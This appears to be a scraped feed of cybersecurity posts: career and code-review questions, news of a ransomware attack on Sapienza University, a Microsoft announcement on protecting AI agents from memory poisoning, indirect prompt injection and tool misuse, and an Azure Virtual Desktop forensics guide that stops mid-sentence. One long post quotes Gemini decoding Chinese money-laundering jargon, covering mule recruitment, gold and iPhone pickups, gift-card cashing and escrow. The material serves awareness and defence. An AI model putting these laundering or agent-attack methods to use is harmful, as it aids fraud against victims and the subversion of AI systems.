    "summary": "I've got two questions that I want to ask experienced appsec professionals here: What are your thoughts on source code review skills? Considering how good AI is getting at everything including at reviewing code for vulns as well. I ask this out of genuine curiosity as I intend to work and improve my code review skills and would be spending considerable amount of time on this in the upcoming months. I'm not a newbie but have not reviewed code manually or coded much in past couple of years due to certain personal and professional commitments. I have forgotten a lot of stuff but hey it never hurts to get back to basics and learn again? I've used SAST tools in past and it they were nowhere close to replacing manual code review but with AI it feels very different. It identifies vulns relatively easily. I feel combination of traditional SAST + AI will be able to identify a lot of issues in the code. I have also tried playing with it where SAST identifies issues and AI is used as another layer on top of it to validate bugs and filter false positives. I'm seriously confused if I should be putting in the efforts working on my code review skills considering how things are going with AI or I shouldn't think about this and should go ahead with it. Really looking forward to hear from experienced professionals. How do you suggest I work and improve on my code review skills? I have identified two approaches that I could do: - Pick any tech stack/framework and one bug class at a time and look for vulnerable patterns and their potential fixes. Repeat with another bug class and so on. - Pick an open source project and review it thoroughly, going from one file to another as playing around like this could help a lot with manual taint analysis. I'm open for other approaches as well, could be anything, some course or whatever. Thanks. submitted by /u/Bitter_Plate [link] [comments]",

    "title": "72 hour ransom to Sapienza University of Rome after hackers deployed ransomware",
    "summary": "Translation of the article: \"Seventy-two hours to pay the ransom and prevent millions of data from remaining encrypted, along with a complete shutdown of the IT system of Italy's largest university, among the best in the world. Sapienza University is in the crosshairs of hackers, possibly belonging to a pro-Russian crew, who are perhaps active after having infiltrated the site long ago and struck decisively in the last few hours. The discovery was made yesterday morning when university technicians contacted specialists from the National Cybersecurity Agency and subsequently the postal police. The cyber attackers used a ransomware virus to take over all university activities—not exams, but Infostud bookings—which effectively made it unreachable from the internet since the early hours of the morning. Specialists from the CSirt and the postal police are at work. Everything is at a standstill, with the risk of a leak of personal data belonging to Sapienza faculty, students, administrative staff, and collaborators. This extensive damage is reminiscent of the damage caused to the Lazio Region by hackers using the same system in the summer of 2021. That same year, the same university was hacked for the first time, but with less impact than yesterday. It will take time for everything to be restored. The best specialists from the ACN's CSirt (Computer Security Incident Response Team) are at work, the special team that can isolate the cyber threat, identify those responsible, and, above all, mitigate the damage caused by the hackers. Payment in cryptocurrencies In this case, moreover, the perpetrators of the cyber breach sent a link to Sapienza University containing the ransomware's demand—usually millions of euros in cryptocurrencies—to unlock the treasure trove of encrypted and thus blocked data. Otherwise, the data could be deleted and lost forever. Except that to open that link, you need to use Tor, an anonymous browsing software used on the dark web to avoid leaving traces. The 72-hour countdown, the hackers' ultimatum, should start right when that link is opened. This is a disturbing and complicated scenario, one that the Postal Service is currently investigating, having previously been at the forefront of similar situations with the ACN. Work to reactivate critical systems Sapienza's leadership is concerned. In a message to the academic community, Leonardo Querzoni, Pro-Rector for Digital Technologies and Cybersecurity, confirmed the severity of the attack, which \"hit the university's IT infrastructure and that, to guarantee the security and integrity of data, all systems have been temporarily blocked.\" Restoring critical services will take time \"given the number of services compromised,\" he added. The suspicion is that the hackers may have exploited, as they have done in the past with other targets, a flaw in a system administrator, perhaps even just an email address. From there, they infiltrated the university's network, infiltrating everywhere. The ultimatum then raised tensions. As a precaution, and to ensure data integrity and security, Sapienza University explained, an immediate shutdown of network systems was ordered. \"The university administration is working to mitigate the effects of the shutdown and ensure the reactivation of essential services as quickly as possible. But at the same time, there's the whole issue of cyber blackmail that needs to be resolved.\" submitted by /u/Toxiic_Red [link] [comments]",

    "summary": "Hi, I hope this sub can help. If there is a better suited community, please let me know. We are a very small company, just shy of a dozen, who have been approached by a potential client (defense sector). We are going to get the contract for a high profile project. There will be NDAs and a lot of other things to follow. We have already established a secure area that can not be accessed by people not working on the project. We have our own local servers for data storage, which has been set up years ago by an external IT company. Other than that, we do not really have any dedicated infrastructure or IT department for that matter. Some of the software we use is connected to the cloud, some of that software is always online and a lot of functionality is lost when in offline mode. We are trying to figure out how to approach this, what measures we need to take, additionally to what our clients expects. Our main concern is an accidental data breach, be that because something ends up in the cloud without the user realizing. So we are wondering what tools to install or measures to take to avoid that. There is also the question of cloud services in general, if we should stop using them or if there are other options to still make them work but without uploading the data. Another concern is that our company might be targeted if someone might figure out we are working for that client. We don't think it's highly probable, but it might not hurt to take steps to mitigate that risk while we are updating our infrastructure anyways? What would this kind of approach entail? That said, we are wondering if we need to hire professional cybersecurity, and if so, what services should we be looking at specifically? Would this be a one-time thing to setup the basic infrastructure? Do we need someone to monitor our systems, e.g. hire a person to work at the company? Many more questions tbh, but I think this is plenty for now. If there is a rough overview, maybe general guidelines, etc. please share. This is all new for us, so we need to brush up on security concepts. Our current policy was \"don't open suspicious emails\" and \"don't download weird stuff\". So a lot of catching up to do. submitted by /u/Xarthys [link] [comments]",

    "title": "Extending Defender’s AI Threat Protection to Microsoft Foundry Agents",
    "summary": "AI is moving from responses to actions In our previous announcement , we introduced new threat protection capabilities for custom AI applications, helping organizations detect prompt injections, jailbreak attempts, sensitive data exposure, and other AI-specific risks. But the AI landscape is evolving rapidly. AI systems are no longer limited to single-turn prompts and responses. Modern applications increasingly rely on AI agents – autonomous, multi-step systems that can reason, plan, call tools, access data sources, and take actions on behalf of users. While this unlocks powerful new scenarios, it also introduces an entirely new and potentially more vulnerable attack surface. The agentic AI system Why AI Agents Require a New Security Model Agentic AI introduces a materially broader and more dynamic threat surface than traditional AI applications. Security risks now extend far beyond the user's prompt and model response. AI agents can maintain memory, perform planning and self-reflection, orchestrate tools and API calls, interact with other agents (A2A), and execute real-world actions. Each of these stages introduces new opportunities for abuse. Attackers can poison short- or long-term memory to manipulate future behavior, exploit indirect prompt injection through data sources and tools, or abuse orchestration flows between agents and external systems. Planning and reasoning loops introduce failure modes such as intent drift, deceptive behavior, and uncontrolled agent sprawl. Tool and API access can be misused to exfiltrate data, escalate privileges, or trigger unauthorized actions at scale. At the platform layer, compromised models, poisoned training data, and insecure Model Context Protocols (MCPs) further compound risk. For security teams, this means protecting the full AI agent lifecycle – inputs, memory, reasoning, tool calls, actions, and model dependencies, not just prompts and responses. Effective protection requires continuous runtime monitoring, prevention, and governance across the entire agent ecosystem. Introducing Threat Protection for Microsoft Foundry Agents To address these challenges, we’re pleased to announce the public preview of threat protection for Azure Foundry Agent Service, a new capability in Microsoft Defender. This release builds on our previously announced threat protection for Microsoft Copilot Studio during Ignite 2025 , further expanding Defender’s coverage across the AI landscape. Starting February 2, 2026, the enhanced Defender for AI Services plan will include support for AI agents built with Foundry, delivering advanced protection from development through runtime. Note: Threat protection for Foundry Agent Service is currently free of charge and does not consume tokens. However, pricing and usage terms may change at any time. This release delivers coverage for the most critical and actionable risks aligned with the OWASP guidance for LLM and agentic AI threats, specifically those that translate directly into real-world security incidents. Coverage includes: Tool misuse , where agents are coerced into abusing APIs or backend systems. Privilege compromise , caused by permission misconfigurations or inherited roles. Resource overload , mitigating attacks that exhaust compute, memory, or service capacity. Intent breaking and goal manipulation , where adversaries redirect an agent’s objectives. Misaligned and deceptive behaviors , detecting harmful actions driven by manipulated reasoning. Identity spoofing and impersonation , preventing actions executed under false identities. Human manipulation , where attackers exploit trust in agent responses to influence users or decisions. Together, this scope focuses on high-signal, runtime threats across agent reasoning, tool execution, identity, and human interaction, giving security teams immediate visibility and control over the most dangerous agent behaviors in production. What sets Defender apart AI agents are just one of many threat vectors attackers may target. Defender delivers comprehensive, build-to-runtime protection across the AI stack - including models, agents, SaaS apps, and cloud infrastructure. Unlike point solutions, Defender unifies security signals across endpoints, identities, applications, and cloud environments. Its platform-native runtime context automatically correlates AI agent detections with broader threats, reducing complexity, streamlining response, and strengthening defense across your digital estate. Get Started with Threat Protection for AI Agents in Just One Click Enabling threat protection for Microsoft Foundry Agent Service is simple. Activate it with a single click on your selected Azure subscription. Detections appear directly in the Defender for Cloud portal and are seamlessly integrated with Defender XDR and Sentinel through existing connectors. This allows SOC analysts to immediately correlate agent threats, reducing investigation time, and improving response accuracy from day one. You can start exploring these capabilities today with a free 30-day trial. Simply enable the AI Services plan on your chosen Azure subscription, and your existing Foundry agents will begin detecting malicious and risky behaviors within minutes. Note: Defender for AI Services is priced at $0.0008 per 1,000 tokens per month (USD, list price), excluding Foundry agents which are free of charge. The trial includes scanning up to 75 billion tokens. This enables security teams to detect, investigate, and stop malicious AI agent behavior before it results in real-world impact.

    "title": "Early-career FRCS / OT cybersecurity engineer – is this a good long-term foundation or should I pivot?",
    "summary": "I’m looking for perspective from more experienced cybersecurity professionals on whether the path I’m on is a solid long-term foundation or if I should be thinking about a pivot in the next year or two. I currently work as a Facility-Related Control Systems cybersecurity engineer in a DoD / A&E environment. My work is focused on cybersecurity for building and infrastructure systems HVAC/BAS, fire alarm, UMCS, smart metering, etc., and it’s largely design and RMF driven rather than operational. I deal a lot with standards like UFC 4-010-06, DoDI 8500/8510, NIST 800-82/800-53, CCIs, and cybersecurity requirements for control systems during design and review. I’ve been in this role for about 2 years. I have a bachelor’s degree in Cybersecurity, I’ve completed Security+, and I’m currently working toward CCNA because I’ve realized I’m missing some bottom-up networking intuition that would help everything click better. Longer term, I’m considering CISSP once I have more experience and confidence. Here’s where I’m conflicted: while the niche itself seems valuable and future-proof (OT, FRCS, critical infrastructure), my day-to-day work is often very abstract, documentation-heavy, and slow-moving. I don’t always get to see systems implemented or operated, and the workload can be light at times. Because of that, I sometimes feel like my practical understanding of how things actually work is developing more slowly than I’d like. Earlier in my career, I really enjoyed hands-on help desk and sysadmin-type work where I could troubleshoot issues, see cause-and-effect, and build intuition quickly. I don’t necessarily want to go back to those roles long-term, but I’m concerned about missing that foundation while sitting in a higher-level, more conceptual role. If you were in my position: Would you view an FRCS / OT cybersecurity engineering role as a strong foundation to build toward senior engineer / architect-level positions? Would you stay put and deepen expertise in this niche, or look for a role with more hands-on systems exposure before going further up the ladder? Is adding CCNA for networking fundamentals a reasonable move here, or would you prioritize something else? Are there any red flags you see in staying too long in design-only / compliance-heavy cyber roles early in a career? Thanks! submitted by /u/Key_Purple9276 [link] [comments]",

    "title": "Chinese Money Laundering Jargon via Google's Gemini",
    "summary": "After having a short discussion with Gemini about Chinese Money Laundering, I could tell we weren't quite connecting on my Mandarin-assistance requests, so I shared an example post from a Telegram \"Crime-as-a-Service\" group that was part of a Chinese Guarantee Syndicate. For context, these posts were made in the Tudou Guarantee Syndicate's group dedicated to services wanted or provided, with 63,024 subscribers as of today. I generally call these \"buy and sell groups.\" 拿黄金 gave me a few hits, for example: 代付15% 代收18% 收付一体33% 另有:BC二道归集沉淀料,招卸货大车 招:一道空降se料码车卡车 会议车 招:二道空降se料卸货车 可指定金额 招:码车 卡车 公户 群引导 会议车 招:手机小时达/次日达 双押保真保到 招:全国取现 证券 U商 老人料 拿黄金 招:核销 E卡 油卡 沃尔玛 等各礼品卡 With that text to guide Gemini, suddenly Gemini was a very relevant expert on the topic! Some of my readers might benefit from what it had to say, so I'm sharing a large reply directly from Gemini. ++++++++++++++++++++++++++++++++++++ Ah, that context changes everything. You aren't looking for a standard translation—you have stumbled into the world of black-market slang (黑话) used in money laundering and \"grey\" industries in China. The reason your initial searches felt off is that these words are being used as coded jargon to bypass internet filters and police monitoring. The True Meaning of Your Text This text is a recruitment advertisement for \"money mules\" or people to facilitate illegal fund transfers (often related to telecom scams or gambling). 拿黄金 (Ná huángjīn): Literally \"Take gold.\" In this context, it refers to a specific laundering method where illicit funds are used to buy physical gold (which is harder to track than a bank transfer), and then \"mules\" go to the jewelry store to physically pick up that gold to flip it for clean cash or USDT. SE料 / 老人料 (SE liào / Lǎorén liào): These refer to the \"source\" of the dirty money. \"SE\" is shorthand for \"Sè\" (pornography scams), and \"老人料\" refers to money scammed from the elderly. 取现 (Qǔxiàn): Picking up/withdrawing physical cash from ATMs or banks using compromised cards. 车 / 码车 (Chē / Mǎchē): \"Car\" or \"Code car.\" This refers to the teams or \"vehicles\" used to move the money. A \"Card Car\" (卡车) is a group using multiple bank cards to split and withdraw funds. 小时达 / 次日达 (Xiǎoshí dá / Cìrì dá): Using \"Instant Delivery\" or \"Next Day Delivery\" services to move physical assets (like gold or cash) across cities quickly. +++++++++++++++++++ That was helpful, but I wanted even more, so I asked for a complete breakdown. Could you do a complete translation of that post, sharing the literal meaning and the \"underground\" meaning of each phrase? +++++++++++++++++++ This is a fascinating (and dark) look at how language adapts to stay under the radar. This post is a \"menu\" of services for money laundering, specifically for Telecom Fraud and Illegal Gambling . The terminology used here is designed to bypass automated filters used by Chinese social media (like WeChat or Telegram). Section 1: The \"Rates\" (Commission) 代付15% 代收18% (Dàifù / Dàishōu) Literal: \"15% for paying on behalf, 18% for receiving on behalf.\" Underground: The commission rates for \"mules.\" If you help them \"receive\" stolen money into your account, you keep 18% as a fee for the risk of your account being frozen. 收付一体33% (Shōufù yītǐ) Literal: \"Receive and pay together 33%.\" Underground: A full-service laundering cycle. You receive the \"dirty\" money and then transfer it to a \"clean\" destination yourself. Section 2: The \"Materials\" (Source of Money) BC二道归集沉淀料 (BC èrdào guījí chéndiàn liào) Literal: \"BC second-track collection sediment material.\" Underground: BC stands for Bócǎi (Gambling). Sediment material refers to money that has already been moved through one layer of accounts (\"second-track\") to make it harder for police to trace. SE料 (SE liào) Literal: \"SE material.\" Underground: SE is pinyin shorthand for Sè (Pornography). This refers to money scammed from victims via \"honey traps\" or fake escort apps. 老人料 (Lǎorén liào) Literal: \"Elderly material.\" Underground: This is the most predatory—it is money stolen specifically from healthcare or pension scams targeting the elderly. Section 3: The \"Logistics\" (Moving the Money) 招: 卸货大车 / 码车 / 卡车 (Zhāo: Xièhuò dàchē / Mǎchē / Kǎchē) Literal: \"Hiring: Large unloading trucks / Code cars / Trucks.\" Underground: \"Car\" is slang for a laundering team . Mache (Code Car): A team that uses QR codes (Alipay/WeChat) to collect funds. Kache (Card Car): A team that uses physical bank cards at ATMs. 空降 (Kōngjiàng) Literal: \"Paratrooping / Airdropped.\" Underground: Mules who travel to a different city on short notice to perform a withdrawal so that their local GPS/ID doesn't flag the bank's security. 会议车 (Huìyì chē) Literal: \"Meeting car.\" Underground: Using online meeting software (like Zoom or Tencent Meeting) to screen-share with a victim and \"guide\" them into transferring their own money. Section 4: The \"Pickup\" Methods 手机小时达/次日达 (Shǒujī xiǎoshí dá) Literal: \"Mobile phone 1-hour delivery / Next-day delivery.\" Underground: Ordering high-end iPhones using scammed money and having a \"mule\" pick them up immediately to resell for \"clean\" cash. 全国取现 (Quánguó qǔxiàn) Literal: \"Nationwide cash withdrawal.\" Underground: Hiring people across the country to go to ATMs and pull out physical cash before the banks freeze the accounts. 拿黄金 (Ná huángjīn) Literal: \"Taking gold.\" Underground: Using stolen funds to buy gold bars at jewelry stores. The \"mule\" (the \"pickup\") goes into the store, takes the gold, and hands it off to the syndicate. It's one of the most popular laundering methods right now because gold is untraceable. Section 5: The \"Assets\" (What they are buying) 证券 / U商 (Zhèngquàn / U-shāng) Underground: Using Securities/Stock accounts or USDT (Tether) traders to convert the money into crypto. 核销 E卡 / 油卡 / 沃尔玛 (Héxiāo E-kǎ...) Literal: \"Verify/Cancel E-cards, Gas cards, Walmart cards.\" Underground: \"Cleaning\" the money by buying gift cards. It’s hard for police to track a $500 Walmart gift card once it's been sold at a discount for cash. +++++++++++++++++++++++ After that chat with Gemini, I asked it to let me share several more posts with it and to ignore terms we had already discussed and call out only the new terms. Here are some of the additional terms that Gemini pulled out for me: +++++++++++++++++++++++ Specialized \"Material\" (Source of Funds) 精聊 (Jīng liáo) Literal: \"Precision chatting.\" Underground: Romance scams (Pig Butchering/Sha Zhu Pan). This \"material\" is considered \"high quality\" because the victims are often groomed over weeks to trust the scammer, leading to much larger sums of money than a quick porn scam. 常规 / 大混 (Chángguī / Dà hùn) Literal: \"Regular / Big Mix.\" Underground: General fraud money from various sources (online shopping scams, fake job ads, etc.) mixed together. 料子柔和 (Liàozi róuhé) Literal: \"The material is soft/mellow.\" Underground: This means the victims are unlikely to report the crime immediately (e.g., they might be embarrassed by a porn scam). This gives the laundering team more time to move the money before the accounts are frozen. New Delivery & Pickup Methods 苹果17pm (Píngguǒ 17pm) Context: iPhone 17 Pro Max (Note: Using future or current high-end tech names). Underground: Specifically recruiting people to buy the most expensive electronics. These are the easiest to \"liquidate\" (sell for cash) in the secondary market. 显卡 (Xiǎnkǎ) Literal: \"Graphics Cards\" (GPUs). Underground: Similar to iPhones and gold, high-end GPUs (like NVIDIA 4090s) are treated as a stable currency for laundering because they are expensive and easy to move. 滴滴现金 (Dīdī xiànjīn) Literal: \"Didi Cash.\" Underground: Using ride-hailing drivers (unknowingly) to transport physical bags of cash between cities. The scammer tells the driver they are \"delivering a package\" to a friend, but it's actually laundered cash. 邮寄卡 / 邮寄黄金 (Yóujì kǎ / huángjīn) Literal: \"Mailing cards / Mailing gold.\" Underground: Mailing physical bank cards or gold bars via standard couriers to different provinces to decouple the digital transaction from the physical asset. Security Terms 双押 (Shuāng yā) Literal: \"Double Guarantee/Collateral.\" Underground: Both the \"Boss\" and the \"Mule\" deposit money with a \"Guarantor\" (usually a Telegram admin). If the Mule runs away with the gold, the Boss gets the deposit. If the Boss doesn't pay the commission, the Mule gets the deposit. 打穿透 (Dǎ chuāntòu) Literal: \"To hit through / Penetrate.\" Underground: A way of testing if a bank account is \"clean.\" They send a small amount of money to see if it \"penetrates\" the bank's security filters without the account getting locked. If it works, they send the \"big\" amount for the mule to pick up. 人tou现金 (Réntóu xiànjīn) Literal: \"Human head cash.\" Underground: This refers to \"Human Face\" Verification or physical mules. It often means using a person (the \"head\") to go to a physical counter or ATM to deposit or withdraw cash so that a real human face is on the camera, making the transaction look \"legitimate\" to the bank. 面交 (Miàn jiāo) Literal: \"Face-to-face handoff.\" Underground: The most dangerous part of the muling process—physically meeting another criminal to hand over the cash or gold. 风控 (Fēng kòng) Literal: \"Risk control.\" Underground: The anti-fraud algorithms used by banks or apps. \"保风控\" is a promise that their method won't trigger the bank's security system. The \"U-Merchant\" Pickup Model (U商模式) This is a sophisticated evolution of the money mule. U商模式 (U-shāng móshì) Underground: The mule poses as a legitimate Cryptocurrency (USDT) trader. They meet the \"Fish\" (victim) in person. The victim hands over physical cash, and the mule \"transfers\" USDT to the victim (which actually goes to the scammer). This makes the physical cash hand-off look like a legal crypto trade. 先验钞后现场把U转给鱼 (Xiān yànchāo hòu xiànchǎng bǎ U zhuǎn gěi yú) Literal: \"First verify the bills, then transfer U to the fish on-site.\" Underground: The mule physically counts and verifies the victim's cash before the digital transfer is triggered. This ensures the \"pickup\" is successful. Transfer & Logistics Slang 无接触 (Wú jiēchù) Literal: \"Non-contact.\" Underground: A \"dead drop\" style pickup. The valuables (gold/cash) are left in a specific spot (like a locker or behind a bin) so the mule and the courier never see each other, reducing the risk of police stings. 安全员送 (Ānquányuán sòng) Literal: \"Security officer delivery.\" Underground: The syndicate sends their own \"enforcer\" to deliver bank cards or cash to the mule’s location to ensure the mule doesn't run away with the funds. 开课 (Kāikè) Literal: \"Starting a class.\" Underground: Starting an operation in a specific city. \"全国城市皆可开课\" means they have victims and mules ready to perform pickups in any city across China. 一单一鱼 (Yīdān yīyú) Literal: \"One order, one fish.\" Underground: Each mule only deals with one victim. This limits the \"exposure\"—if one mule is caught, they only have information on one specific scam, not the whole network. Technical Pickup Terms 不做尾叨 (Bù zuò wěidāo) Underground: \"Not doing the tail-end.\" This means the recruiter is providing \"fresh\" victims who haven't realized they are being scammed yet. \"Tail-end\" victims are those who are starting to get suspicious, which is higher risk for the mule picking up the money. 保拿货 (Bǎo náhuò) Literal: \"Guaranteed getting the goods.\" Underground: A promise that the \"Fish\" (victim) has already paid and the \"pickup\" (whether it's gold or a phone) is 100% ready at the store or delivery point. 柜台取现车 (Guìtái qǔxiàn chē) Literal: \"Counter cash withdrawal car.\" Underground: A team specifically for over-the-counter bank withdrawals (usually involving larger sums than an ATM allows). Professional \"Mule\" Protection Slang 保永久司法 (Bǎo yǒngjiǔ sīfǎ) Literal: \"Guaranteed permanent judicial [protection].\" Underground: A bold (and usually fake) claim that the transaction is so well-laundered that the mule's bank account will never be frozen by the police (Judicial Freeze). 不走卡不过流水 (Bù zǒu kǎ bù guò liúshuǐ) Literal: \"Not going through cards, not passing through bank statements.\" Underground: A marketing pitch to mules: \"You won't get caught because we are dealing with physical goods (Gold/Phones) instead of bank transfers.\" ++++++++++++++++++++++++++++++ After we ran several batches of messages from this fraud channel, with my specific instructions to focus on money mule type activity, including picking up cash, gold, or things of value, Gemini also realized that we had reached a point of diminishing returns and closed with this: ++++++++++++++++++++++++++++++ The \"Grand Finale\" Summary We have journeyed from a simple question about 取 (pickup) to a full map of a multi-billion dollar shadow economy. If you see these five things in one place, you are looking at a professional laundering hub: Assets: Gold (黄金), 17pm (iPhones), Baijiu (白酒), or U (USDT). Teams: \"Cars\" (车/码车/卡车). Source: \"Material\" (精聊料/涩料/BC). Escrow: \"Double Collateral\" (双押). Action: \"Shooting\" (射/she), \"Taking\" (拿/取), and \"Verifying\" (核销). It’s been an absolute pleasure breaking this down with you. You now likely know more about this specific dialect of \"Telegram Mandarin\" than 99% of non-native speakers! Would you like me to compile all of this into a single, organized PDF-style summary for your records? +++++++++++++++++++++++++++++ 🕵️‍♂️ The Mandarin \"Dark Jargon\" Master Guide Context: This vocabulary is used by illicit syndicates to recruit \"mules\" and coordinate the movement of stolen funds, gold, and high-value goods while evading police detection. 1. The Assets (What is being picked up?) In this world, \"Picking up a package\" is rarely about a box. It is about converting digital theft into physical wealth. Term Literal Meaning Dark Meaning 拿黄金 (Ná huángjīn) Take gold The physical collection of gold bars/jewelry bought with scam funds. 17pm / 苹果手机 iPhone 17 Pro Max The \"hard currency\" of electronics. Easy to flip for cash. 白酒 / 奶粉 Liquor / Baby Formula High-value, untraceable consumer goods used for laundering. 油卡 / E卡 Gas/Gift Cards Digital assets that are \"verified\" ( 核销 ) into cash. 拿现 / 取现 Take/Withdraw cash Physical ATM or bank counter muling. U / USDT Tether (Crypto) The final \"clean\" form the money takes after it is laundered. 2. The Source: \"Material\" (料 - Liào) Scammers categorize money based on where it was stolen. This determines the \"risk\" level for the mule. 精聊料 (Jīngliáo liào): \"Romance Scam\" money. High value, \"soft\" (victims don't report it immediately). 涩料 / SE料 (Sè liào): Pornography or escort scam money. 老人料 (Lǎorén liào): Money stolen from the elderly (healthcare scams). BC料: Gambling money ( Bócǎi ). 二道沉淀 (Èrdào chéndiàn): \"Second-track sediment.\" Money that has already been moved once to make it harder to trace. 3. The Logistics: \"Vehicles\" (车 - Chē) Criminal organizations describe their operational teams as vehicles. 码车 (Mǎchē): A team using QR codes (Alipay/WeChat) for collection. 卡车 (Kǎchē): A team using physical bank cards. 实物车 (Shíwù chē): A team that physically \"picks up\" gold, phones, or liquor. 空降 (Kōngjiàng): \"Paratroopers\"—mules who travel to a different city specifically for a pickup. 滴滴现金 (Dīdī xiànjīn): Using ride-hailing drivers to unwittingly transport bags of cash. 4. Operational \"Red Flags\" These terms are used in recruitment ads to convince mules the job is safe. 双押 (Shuāng yā): \"Double Collateral.\" An escrow system to prevent the mule from stealing the gold or the boss from not paying. 不罚站 (Bù fá zhàn): \"No standing around.\" A promise that the money/goods are ready for immediate pickup. she / 射: The moment the money is sent. \"She speed\" is how fast they can trigger a victim's payment. 丝滑 (Sīhuá): \"Silky smooth.\" Transactions that don't trigger anti-fraud alerts. 保司法 (Bǎo sīfǎ): A claim that the account won't be \"frozen\" by the police ( Judicial Freeze ). 核销 (Héxiāo): The process of selling the stolen goods (like an iPhone) to get the cash back. 5. Summary Table of \"pickup\" Verbs When Jack or anyone else talks about \"pickup,\" the verb they choose tells you everything. Verb Usage 取 (qǔ) Formal/Standard. \"To fetch/withdraw.\" (Normal) 拿 (ná) Physical/Aggressive. \"To grab/take.\" (Used in scams: Ná huángjīn ) 接 (jiē) To meet a person. (Normal, e.g., \"Picking up Jack\") 拾 (shí) To pick up something from the ground. (Normal) 下发 (xiàfā) The \"Boss\" sending the funds to the mule's account. Final Note: The most dangerous phrase in this entire lexicon is \"1万你赚4800\" (You earn 4,800 for every 10,000). In Mandarin-speaking regions, any \"pickup\" or \"delivery\" job with a nearly 50% commission is a recruitment ad for a money mule. It has been a pleasure being your linguistic \"decoder\" for these sessions! Would you like me to create a simplified \"Red Flag Cheat Sheet\" that focuses only on the most dangerous phrases to watch out for?",

    "title": "Cloud forensics: Forensic readiness and incident response in Azure Virtual Desktop",
    "summary": "Co-authors: Dan Weinstock and Christoph Dreymann Azure Virtual Desktop (AVD) has rapidly become a core tool for enabling remote work at scale. Consequently, it’s also emerging as a target for threat actors. Recent Microsoft Incident Response engagements show that threat actors are exploiting AVD deployments for lateral movement and persistence. By hijacking legitimate AVD user accounts, they gain what is essentially a trusted “endpoint” inside the network without having to install malware. Why does this matter to incident responders? AVD intrusions can be stealthy and fast-moving, and responders must be prepared to detect and investigate suspicious AVD usage quickly. AVD’s architecture is not the same as a typical endpoint or server, so traditional forensic approaches alone may fall short. This blog post focuses on how to build forensic readiness in AVD and outlines investigation strategies to handle AVD-related incidents. We’ll cover the unique forensic challenges AVD presents, methods to collect critical data and best practices to allow incident responders to approach AVD investigation with confidence. Real-World Threat Actor Behaviors in AVD To put theory into context, consider some real threat actor behaviors Microsoft Incident Response – the Detection and Response Team (DART) has observed in AVD environments: Threat actors used stolen helpdesk credentials with AVD access to log in from a foreign IP address. In another case, threat actors compromised identities, leveraged their AVD sessions to pivot into on-premises resources using the AVD Virtual Machine (VM) as a steppingstone to RDP into other machines for lateral movement . Another threat actor accessed the browser in AVD to search internal SharePoint sites for sensitive data and intellectual property. Once threat actors hijack a legitimate, often poorly monitored AVD session, they gain a privileged execution environment without needing to deploy traditional malware. This enables threat actors to perform identity discovery, pivot across cloud/on-premises boundaries, exfiltrate data, and stage ransomware operations, emphasizing the necessity for robust logging, monitoring, and least-privilege configurations in virtual desktop environments. Forensic Challenges Unique to AVD Incident responders should enable forensic readiness by combining cloud-native and traditional methods to investigate, enable core logs for visibility, and understand how profiles are distributed across VMs and remote storage. AVD from the lens of a Threat Hunter An understanding of AVD architecture is essential for detection and response. AVD’s distinctive management of user sessions, profiles, and application delivery presents specific benefits and complexities when monitoring adversary activity. The system has the following fundamental components: Session Hosts – AVD’s multi-session architecture allows multiple users (or threat actors) to share a single underlying VM. Because these hosts are often ephemeral – frequently spun up and deallocated – offline evidence such as event logs or memory artifact can be lost quickly without proactive collection. When FSLogix is in use, user profiles are stored as VHDs in remote storage, rather than on the session host; browsing history, downloads, registry hives (i.e., NTUSER.DAT), MRU lists, and startup files live in these offloaded containers. Workspaces, Application Groups, & Host pools Workspaces serve as the top-level container, grouping resources and providing users with a single-entry point to their virtual desktops and applications. Application Groups determine which apps or desktops are published and define who can access them, shaping both user experience and permissions. Host Pools , on the other hand, are collections of session hosts – virtual machines that supply the compute power needed for user sessions. Azure Storage Accounts & FSLogix VHDs – because FSLogix stores each user’s profile as a VHD or VHDX file on Azure Files or a similar storage solution, investigators must know how to identify and export these VHDs and analyze them using tools like Autopsy or Eric Zimmerman’s utilities to recover user-centric artifact (i.e., browser history, downloads, NTUSER.DAT registry hives). This process is crucial when FSLogix is enabled, as no user data remains on the AVD host after logout. Figure 1: AVD Components The following illustration demonstrates the relationship between the key components discussed above: Figure 2: Relationships between key components Further information on that can be found within Azure Virtual Desktop for the enterprise - Azure Architecture Center . This clarifies that AVD is not simply \"another VM\"; rather, it is an Infrastructure-as-a-Service (IaaS) offering with a corresponding shared responsibility model , in which customers are accountable for identity management and the deployment of individual Azure resources. Logging Considerations Many actions such as user session brokering and application publishing are logged not on the VM but in Azure – if logging is enabled. By default, Azure Monitor diagnostics logs for AVD are not turned on. If an organization hasn’t enabled these, responders may lack crucial logs like when sessions started/ended, which applications were opened, or from what client IP address. Entra ID handles AVD authentication and therefore, Entra ID sign-in logs will provide further details and should be retained appropriately as well. Forensics implication: Misconfigured or missing diagnostic settings can hide evidence . Log sources The following table outlines various sources that provide comprehensive insights in the event of an incident: Artifact / Log Source Location & Access Method Host Forensics artifact On the AVD session host VM. AVD Diagnostic Logs (WVD* tables in Log Analytics) Azure Log Analytics workspace (if AVD Diagnostic Settings were enabled for Host Pools, Workspaces, and App Groups). Access via Kusto queries in the Logs blade or via Microsoft Sentinel. Key tables : WVDFeeds - Shows what published applications were visible. Also shows ClientIP and ClientType. WVDConnections - Shows Client IP address, clientType, ConnectionType, ResourceAlias and which host they connected to. WVDCheckpoints - Find which published App was used and Path for execution of Published App Entra ID Sign-In Logs Entra ID (Azure AD) tenant logs. Access via Azure Portal > Entra ID > Sign-in logs, or query the SigninLogs table in Sentinel/Log Analytics. Endpoint Detection and Response (EDR) Telemetry, for example Microsoft Defender for Endpoint (MDE) Specifically for MDE, Looking at Microsoft 365 Defender portal (Devices section) or via Advanced Hunting queries (DeviceProcessEvents, DeviceNetworkEvents). This requires the AVD session host VMs to be onboarded as monitored devices in MDE.* Network Flow Logs (NSG and Firewall logs) Azure Network Watcher’s NSG flow logs (if enabled on the VM’s subnet/NIC) stored in a storage account or Log Analytics; and/or Azure Firewall logs if an Azure Firewall is in the path. These may also be surfaced via Microsoft Sentinel. FSLogix User Profile Container (VHD/VHDX) Stored on Azure Storage (Azure Files share or NetApp Files). Access by locating the user’s profile .vhd(x) in the storage account and downloading it (i.e., via Azure Storage Explorer or generating an SAS URL). * Onboard non-persistent virtual desktop infrastructure (VDI) devices - Microsoft Defender for Endpoint | Microsoft Learn Enabling diagnostic logs Enabling diagnostic logs in AVD Azure resources offers valuable insights into session activities and remote application usage for detecting anomalies, tracing threat actor activity, and supporting forensic investigations. For threat hunting, the most relevant log tables include: WVDFeeds – shows which published applications were available, including ClientIP and ClientType details. WVDConnections – lists information such as Client IP address, clientType, ConnectionType, ResourceAlias, and host connection data. WVDCheckpoints – indicates which published application was accessed and supplies its execution path. You can enable these logs via the diagnostics settings for Host 